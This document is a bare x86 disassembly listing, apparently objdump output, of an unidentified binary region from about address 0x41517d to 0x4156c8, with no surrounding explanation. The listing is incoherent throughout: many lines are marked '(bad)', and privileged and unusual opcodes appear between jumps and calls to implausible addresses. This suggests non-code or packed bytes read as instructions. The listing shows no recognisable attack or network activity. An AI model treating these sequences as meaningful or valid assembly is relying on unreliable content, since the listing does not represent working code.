  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
  41519f:	fadd   DWORD PTR [ebx]
  4151a1:	inc    ebp
  4151a2:	jmp    0x41512f
  4151a4:	mov    ecx,DWORD PTR [esp+edx*2]
  4151a7:	rol    DWORD PTR [ebp+0x45],0x8b
  4151ab:	mov    edi,esp
  4151ad:	lock (bad) 
  4151af:	dec    ebp
  4151b0:	ret    
  4151b1:	mov    eax,DWORD PTR [ebp+0x10]
  4151b4:	mov    eax,DWORD PTR [ecx-0x4]
  4151b7:	mov    eax,edi
  4151b9:	fadd   st,st(3)
  4151bb:	enter  0x1645,0x8b
  4151bf:	inc    ebp
  4151c0:	cld    
  4151c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4151c4:	xor    ecx,DWORD PTR [ebp+0x3]
  4151c7:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  4151cd:	sub    eax,DWORD PTR [ebp-0x17]
  4151d0:	xor    eax,DWORD PTR [edx]
  4151d2:	pushf  
  4151d3:	add    bh,al
  4151d5:	or     al,0xd8
  4151d7:	jne    0x41515e
  4151d9:	(bad)  
  4151da:	clc    
  4151db:	mov    al,0x45
  4151dd:	call   0xffde481f
  4151e2:	jmp    0xdd5518
  4151e7:	mov    DWORD PTR [ebp-0x30],eax
  4151ea:	xor    eax,DWORD PTR [ebp+0x3]
  4151ed:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  4151f3:	enter  0x8503,0xc
  4151f7:	clc    
  4151f8:	inc    ebp
  4151f9:	inc    ebp
  4151fa:	push   DWORD PTR [edx]
  4151fc:	in     al,dx
  4151fd:	pushf  
  4151fe:	jne    0x41518d
  415200:	mov    edx,eax
  415202:	clc    
  415203:	dec    ebp
  415204:	out    dx,eax
  415205:	(bad)  
  415206:	dec    esp
  415208:	mov    DWORD PTR [ebp-0x10],ecx
  41520b:	lea    eax,[ebp-0x38]
  41520e:	cmp    DWORD PTR [ebp-0x64],ecx
  415211:	lea    ecx,[ebx-0x38b2273c]
  415217:	mov    eax,ebx
  415219:	cld    
  41521a:	(bad)  
  41521b:	iret   
  41521c:	mov    esp,0xf74de8cb
  415221:	jmp    0x865425
  415226:	test   DWORD PTR [ebx],esi
  415228:	je     0x4151c6
  41522a:	mov    ecx,DWORD PTR [edi]
  41522c:	fdivr  st,st(6)
  41522e:	mov    DWORD PTR [eax],0xe8ff8bc3
  415234:	lock iret 
  415236:	inc    ebp
  415237:	lock push eax
  415239:	retf   
  41523a:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  415241:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  415248:	dec    ebp
  415249:	mov    DWORD PTR [ebx],ebp
  41524b:	fmul   DWORD PTR [ecx+0x458bd845]
  415251:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  415257:	enter  0x1303,0xc
  41525b:	inc    ebp
  41525c:	dec    ebp
  41525d:	xor    edi,DWORD PTR [ebx]
  41525f:	add    esi,DWORD PTR [edx+0x50]
  415262:	mov    ecx,DWORD PTR [eax+esi*8]
  415265:	inc    ebp
  415266:	inc    eax
  415267:	push   eax
  415268:	mov    ebp,esp
  41526a:	lock inc DWORD PTR [ecx-0x75]
  41526e:	mov    esp,esp
  415270:	fadd   DWORD PTR [eax]
  415272:	rol    edi,0xee
  415275:	test   BYTE PTR [eax],al
  415277:	dec    esp
  415278:	push   0x32
  41527a:	dec    DWORD PTR [ebx-0x30ba0314]
  415280:	push   eax
  415281:	mov    dh,0x21
  415283:	add    edi,edi
  415285:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41528b:	add    BYTE PTR [ebp-0x75],al
  41528e:	(bad)  
  41528f:	loopne 0x41525d
  415291:	add    BYTE PTR [ebp+0x4584f8c7],al
  415297:	dec    esp
  415298:	xor    esi,DWORD PTR [edx]
  41529a:	pushf  
  41529b:	mov    eax,edi
  41529d:	cld    
  41529e:	(bad)  
  41529f:	iret   
  4152a0:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4152a6:	mov    DWORD PTR [edi],ecx
  4152a8:	in     al,0x58
  4152aa:	dec    ebp
  4152ab:	add    BYTE PTR [ecx+0x4df0e08b],cl
  4152b1:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  4152b7:	dec    esp
  4152b8:	mov    DWORD PTR [edx],esi
  4152ba:	fmul   QWORD PTR [ebx-0x30cc03b3]
  4152c0:	add    esi,DWORD PTR [esi+0x3bd80389]
  4152c6:	test   DWORD PTR [edi],0x3d3800
  4152cc:	test   DWORD PTR [ebx+0x84dcf8],ecx
  4152d2:	add    edi,eax
  4152d4:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  4152db:	mov    eax,DWORD PTR [ebx]
  4152dd:	cld    
  4152de:	mov    edi,ecx
  4152e0:	hlt    
  4152e1:	mov    dh,0x45
  4152e3:	add    esi,DWORD PTR [ebx]
  4152e5:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  4152eb:	add    BYTE PTR [eax],al
  4152ed:	mov    eax,DWORD PTR [ebp-0x20]
  4152f0:	mov    eax,DWORD PTR [eax]
  4152f2:	call   0x33c5a0be
  4152f7:	dec    esp
  4152f8:	add    esi,DWORD PTR [edx]
  4152fa:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  415300:	cld    
  415301:	iret   
  415302:	(bad)  
  415303:	mov    ebx,es
  415305:	dec    esp
  415306:	push   0x32
  415308:	lea    esi,[edx]
  41530a:	mov    al,0x8b
  41530c:	call   0xff4b4e01
  415311:	iret   
  415312:	inc    ebp
  415313:	mov    WORD PTR [ebx-0x75cdccb4],cs
  415319:	or     al,BYTE PTR ds:0xe4728b
  41531f:	or     DWORD PTR [ebp-0x31],ecx
  415322:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  415329:	cmp    al,cl
  41532b:	je     0x415505
  415331:	mov    eax,DWORD PTR [ebp-0x10]
  415334:	mov    eax,DWORD PTR [eax]
  415336:	xor    eax,edi
  415338:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41533f:	mov    ecx,DWORD PTR [ebp-0x20]
  415342:	xor    ecx,DWORD PTR [ecx]
  415344:	bswap  edi
  415346:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41534e:	add    DWORD PTR [ebx+0x945dc00],ecx
  415354:	mov    ecx,edi
  415356:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41535d:	or     al,BYTE PTR [eax]
  41535f:	mov    ecx,DWORD PTR [ebp-0x20]
  415362:	xor    ecx,DWORD PTR [ecx]
  415364:	bswap  edi
  415366:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41536e:	add    DWORD PTR [edi],ecx
  415370:	add    BYTE PTR [eax-0x7474ffbb],dl
  415376:	xor    ebx,esp
  415378:	mov    al,BYTE PTR [eax]
  41537a:	add    eax,0x8472c7
  41537f:	dec    esp
  415380:	dec    ebp
  415381:	xor    dh,BYTE PTR [ebx]
  415383:	mov    ecx,DWORD PTR [edi]
  415385:	lock ror BYTE PTR [ecx],0xcb
  415389:	iret   
  41538a:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  415392:	inc    ebp
  415393:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  415399:	iret   
  41539a:	add    eax,0x4c728c
  41539f:	xor    cl,BYTE PTR [ebp+0xa]
  4153a2:	mov    ecx,DWORD PTR [ebx+0x98af033]
  4153a8:	or     eax,0x8c72cf
  4153ad:	push   eax
  4153ae:	shl    DWORD PTR [edx],0x4d
  4153b1:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4153b7:	fmul   QWORD PTR ds:0xc77200
  4153bd:	test   cl,al
  4153bf:	dec    esp
  4153c0:	dec    ebp
  4153c1:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  4153c7:	or     DWORD PTR ds:0x8c72cf,ecx
  4153cd:	dec    esp
  4153ce:	enter  0x8532,0x32
  4153d2:	add    BYTE PTR [ebx+0x945e000],cl
  4153d8:	mov    ecx,edi
  4153da:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  4153e1:	or     al,BYTE PTR [eax]
  4153e3:	mov    ecx,DWORD PTR [ebp-0x24]
  4153e6:	mov    ecx,DWORD PTR [ecx]
  4153e8:	xor    ecx,edi
  4153ea:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  4153f1:	cmp    al,cl
  4153f3:	jne    0x415442
  4153f5:	lea    ecx,[ebx-0x7517cc50]
  4153fb:	sti    
  4153fc:	or     eax,0x4d72ff
  415401:	cmp    eax,ecx
  415403:	je     0x415452
  415405:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41540b:	ret    
  41540c:	or     eax,0x8b7245
  415411:	call   0x84c71bde
  415416:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41541d:	mov    esi,DWORD PTR [ebx]
  41541f:	cld    
  415420:	mov    dl,BYTE PTR [ebp+0x5]
  415423:	xor    esi,DWORD PTR [edx+0x3]
  415426:	add    BYTE PTR [ebx],bh
  415428:	dec    ebp
  415429:	jnp    0x8b408826
  41542f:	mov    ecx,DWORD PTR ds:0x4d72fc
  415435:	xor    eax,ecx
  415437:	add    ecx,DWORD PTR [ebp+0x3b]
  41543a:	mov    esi,DWORD PTR [ebp+0x33]
  41543d:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  415443:	xor    eax,DWORD PTR [eax]
  415445:	(bad)  
  415446:	ror    DWORD PTR [eax],0x4d
  415449:	jb     0x4153d6
  41544b:	add    BYTE PTR [ebx],dh
  41544d:	ja     0x4153d9
  41544f:	sbb    BYTE PTR ds:0x8d7275,cl
  415455:	cwde   
  415456:	enter  0x50e8,0xf3
  41545a:	inc    ebp
  41545b:	dec    DWORD PTR [ebx-0x7574ccbb]
  415461:	fadd   DWORD PTR ds:0xc372c7
  415467:	ror    DWORD PTR [ebp+0x13],0x8b
  41546b:	inc    ebp
  41546c:	xor    esi,DWORD PTR [ebx]
  41546e:	mov    al,BYTE PTR [ebx]
  415470:	or     eax,0x187250
  415475:	inc    ebp
  415476:	rcl    DWORD PTR [eax+0x4d],0xdc
  41547a:	mov    edi,edi
  41547c:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  415482:	jb     0x41540d
  415484:	add    ah,bl
  415486:	shl    DWORD PTR [ebp+0x4d],0xff
  41548a:	mov    ebx,esp
  41548c:	xor    eax,DWORD PTR [ebp-0x76]
  41548f:	add    ecx,DWORD PTR ds:0xe87208
  415495:	repz enter 0x10ff,0x45
  41549a:	inc    ebp
  41549b:	mov    edx,DWORD PTR [eax-0x28]
  41549e:	xor    bh,al
  4154a0:	inc    ebx
  4154a2:	mov    eax,ecx
  4154a4:	mov    eax,0xa00c111
  4154a9:	jne    0x4154f0
  4154ab:	mov    esi,DWORD PTR [ebx]
  4154ad:	test   al,0x3
  4154af:	inc    ebp
  4154b0:	mov    DWORD PTR [eax-0xc],edx
  4154b3:	mov    ds:0x8b33ff45,al
  4154b8:	lea    edx,[eax]
  4154ba:	xor    BYTE PTR [ebp+0x72],cl
  4154bd:	add    DWORD PTR [eax],eax
  4154bf:	mov    eax,edi
  4154c1:	lods   al,BYTE PTR ds:[esi]
  4154c2:	dec    ebp
  4154c3:	inc    ebp
  4154c4:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  4154ca:	retf   
  4154cb:	mov    edx,ecx
  4154cd:	adc    al,0x84
  4154cf:	(bad)  
  4154d0:	std    
  4154d1:	ret    
  4154d2:	jmp    FWORD PTR [edi-0x37474bb]
  4154d8:	hlt    
  4154d9:	push   ebp
  4154da:	(bad)  
  4154db:	xor    eax,ebx
  4154dd:	(bad)  
  4154de:	enter  0x1111,0x72
  4154e2:	inc    ebp
  4154e3:	add    BYTE PTR [ebx-0x387deb3f],cl
  4154e9:	cld    
  4154ea:	test   bh,bh
  4154ec:	pushf  
  4154ed:	inc    ebp
  4154ee:	xor    bl,BYTE PTR [edi-0x15]
  4154f1:	pop    ebx
  4154f2:	push   0xffffffc2
  4154f4:	inc    DWORD PTR [eax]
  4154f6:	in     al,dx
  4154f7:	mov    eax,DWORD PTR [ebp+0x51]
  4154fa:	push   eax
  4154fb:	inc    ebp
  4154fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154fd:	mov    edi,edi
  4154ff:	or     BYTE PTR [ebx+0x4d80fc16],cl
  415505:	add    DWORD PTR [ebx],esi
  415507:	add    BYTE PTR [ebx],al
  415509:	add    BYTE PTR [ebx],bh
  41550b:	icebp  
  41550c:	je     0x415516
  41550e:	mov    eax,DWORD PTR [edi]
  415510:	cld    
  415511:	rol    edi,0x72
  415514:	ret    
  415515:	add    BYTE PTR [edx-0x2f],ch
  415518:	lea    edx,[eax]
  41551a:	cwde   
  41551b:	jne    0x415505
  41551d:	(bad)  
  41551e:	clc    
  41551f:	or     al,0xff
  415521:	inc    DWORD PTR [ebp-0x18]
  415524:	cmp    ebx,0x18
  415527:	inc    DWORD PTR [ebp+0x6]
  41552a:	call   FWORD PTR [ebp-0x54]
  41552d:	or     al,0x75
  41552f:	push   ebp
  415530:	mov    ebp,esp
  415532:	test   al,0x53
  415534:	inc    ebp
  415535:	mov    edx,DWORD PTR [eax-0x75]
  415538:	imul   ecx,DWORD PTR [eax],0xffffffff
  41553b:	dec    ebp
  41553c:	mov    edx,DWORD PTR [edi-0x4]
  41553f:	push   ebp
  415540:	dec    ebp
  415541:	push   ecx
  415542:	xor    esi,DWORD PTR [ebx]
  415544:	add    edi,DWORD PTR [edi+0x74723b]
  41554a:	push   0xffffffc7
  41554c:	inc    DWORD PTR [ecx]
  41554e:	lods   al,BYTE PTR ds:[esi]
  41554f:	inc    ebp
  415550:	inc    ebp
  415551:	mov    eax,DWORD PTR [ebx]
  415553:	xchg   esp,eax
  415554:	or     BYTE PTR [eax],al
  415556:	call   0xffcd4de6
  41555b:	adc    al,0x45
  41555d:	or     BYTE PTR [ebx+0x800ac01],0x0
  415564:	inc    ebp
  415565:	inc    ecx
  415566:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41556c:	mov    eax,DWORD PTR [ecx]
  41556e:	call   0x338aa273
  415573:	push   0x3
  415575:	push   0xc1300f
  41557a:	dec    ebp
  41557b:	jo     0x415508
  41557d:	push   0xffffffd4
  41557f:	dec    edi
  415581:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  415588:	cmp    eax,edi
  41558a:	cmovne edx,DWORD PTR [edi-0x75]
  41558e:	call   DWORD PTR [eax]
  415590:	mov    eax,DWORD PTR [ebp+0x8]
  415593:	call   FWORD PTR [esi+0x14]
  415596:	leave  
  415597:	inc    ebp
  415598:	adc    BYTE PTR [eax+0x55],dl
  41559b:	jne    0x415589
  41559d:	call   0xff52552d
  4155a2:	dec    ebp
  4155a3:	inc    ebp
  4155a4:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4155aa:	add    BYTE PTR [ebx],bh
  4155ac:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4155b0:	push   ebp
  4155b1:	or     al,0x51
  4155b3:	dec    ebp
  4155b4:	xor    DWORD PTR [ebx],0xf32039c
  4155ba:	cmp    eax,DWORD PTR [ebp+0x74]
  4155bd:	mov    edi,edi
  4155bf:	pop    edi
  4155c0:	adc    BYTE PTR [ebx+0x75],bl
  4155c3:	ret    0x50
  4155c6:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  4155ca:	(bad)  
  4155cb:	clc    
  4155cc:	mov    esp,ebp
  4155ce:	pop    ecx
  4155cf:	mov    ecx,0xf80085c2
  4155d4:	mov    ecx,DWORD PTR [ecx+edx*2]
  4155d7:	push   esi
  4155d8:	push   esi
  4155d9:	(bad)  
  4155da:	lock inc DWORD PTR [ebp+0x44]
  4155de:	mov    edx,DWORD PTR [eax]
  4155e0:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  4155e4:	or     BYTE PTR [ebp+0x7],dl
  4155e7:	push   ecx
  4155e8:	ret    
  4155e9:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  4155f0:	mov    esi,edi
  4155f2:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  4155f6:	cmp    BYTE PTR [ebp+0x1],0x89
  4155fa:	add    BYTE PTR [eax+ecx*1],ah
  4155fd:	cmp    DWORD PTR [ebp+0x10],eax
  415600:	mov    edx,DWORD PTR [esi]
  415602:	xchg   esp,eax
  415603:	dec    esp
  415604:	add    BYTE PTR [eax],dl
  415606:	mov    ecx,edx
  415608:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41560c:	dec    ebp
  41560d:	into   
  41560e:	mov    ebp,DWORD PTR [edi+0x240089d8]
  415614:	mov    edx,DWORD PTR [eax+0x14]
  415617:	das    
  415618:	add    al,0x45
  41561a:	add    BYTE PTR [ebp+0x0],dh
  41561d:	mov    edi,edi
  41561f:	and    al,0x50
  415621:	mov    eax,DWORD PTR [eax]
  415623:	and    al,0xd1
  415625:	xor    eax,DWORD PTR [esi]
  415627:	lea    eax,[ebp+0x8]
  41562a:	xor    esi,DWORD PTR [edx+0x3]
  41562d:	add    BYTE PTR [ecx+0x4510fc44],cl
  415633:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  415639:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  415643:	xor    bh,bh
  415645:	pushf  
  415646:	mov    edi,edi
  415648:	or     BYTE PTR [esi+ecx*1],cl
  41564b:	jne    0x415610
  41564d:	call   0xa5619
  415652:	adc    BYTE PTR [ebp+eax*2+0xc],al
  415656:	mov    ebx,DWORD PTR [eax]
  415658:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41565c:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  415664:	pop    esi
  415665:	dec    ecx
  415667:	and    al,0x10
  415669:	call   DWORD PTR [ebp+0x24]
  41566c:	in     al,dx
  41566d:	call   0xffc55556
  415672:	adc    BYTE PTR [ecx+esi*1+0xc],al
  415676:	pushf  
  415677:	pop    esi
  415678:	mov    ebp,esp
  41567a:	and    al,0xc2
  41567c:	push   edi
  41567d:	add    BYTE PTR [ecx+0x33],al
  415680:	mov    DWORD PTR [ebp+0x24],esi
  415683:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  415689:	dec    DWORD PTR [eax]
  41568b:	and    al,0x7
  41568d:	(bad)  
  41568e:	cli    
  41568f:	and    al,0x9c
  415691:	or     BYTE PTR [edx],dh
  415693:	sbb    BYTE PTR [ebx],al
  415695:	adc    al,0x89
  415697:	jmp    DWORD PTR [esp]
  41569a:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  4156a0:	adc    al,0x8
  4156a2:	dec    ebp
  4156a3:	adc    BYTE PTR [ebp-0x7c],dh
  4156a6:	mov    esi,DWORD PTR [edx]
  4156a8:	and    al,0x24
  4156aa:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  4156b0:	add    edi,eax
  4156b2:	pcmpeqb mm1,mm2
  4156b5:	jmp    0x415703
  4156b7:	dec    DWORD PTR [eax]
  4156b9:	je     0x4156a6
  4156bb:	mov    edi,DWORD PTR [ecx]
  4156bd:	pop    ebp
  4156be:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  4156c2:	pushf  
  4156c3:	mov    DWORD PTR [eax-0x8],ebp
  4156c6:	jge    0x415730
  4156c8:	dec    DWORD PTR [ecx+0x5fbf7424]
